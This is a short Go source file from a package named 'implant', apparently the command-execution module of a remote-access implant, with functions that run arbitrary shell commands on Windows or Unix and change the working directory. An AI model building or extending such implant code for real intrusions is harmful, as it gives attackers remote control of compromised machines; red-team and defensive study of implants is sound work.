package implant

import (
	"bytes"
	"context"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const shellTimeout = 120 * time.Second

// ExecuteShell runs a shell command and returns the output.
// On Windows it uses cmd.exe, on Linux/macOS it uses /bin/sh.
func ExecuteShell(args []string) ([]byte, error) {
	command := strings.Join(args, " ")

	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd.exe")
		cmd.SysProcAttr = windowsCmdLine("cmd.exe /S /C \"" + command + "\"")
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	// Combine stdout and stderr
	output := stdout.Bytes()
	if stderr.Len() > 0 {
		if len(output) > 0 {
			output = append(output, '\n')
		}
		output = append(output, stderr.Bytes()...)
	}

	if err != nil && len(output) == 0 {
		return []byte(err.Error()), err
	}

	return output, nil
}

// ChangeDirectory changes the working directory.
func ChangeDirectory(path string) ([]byte, error) {
	if err := chdir(path); err != nil {
		return nil, err
	}
	// Return new working directory
	wd, _ := getwd()
	return []byte("Changed directory to: " + wd), nil
}
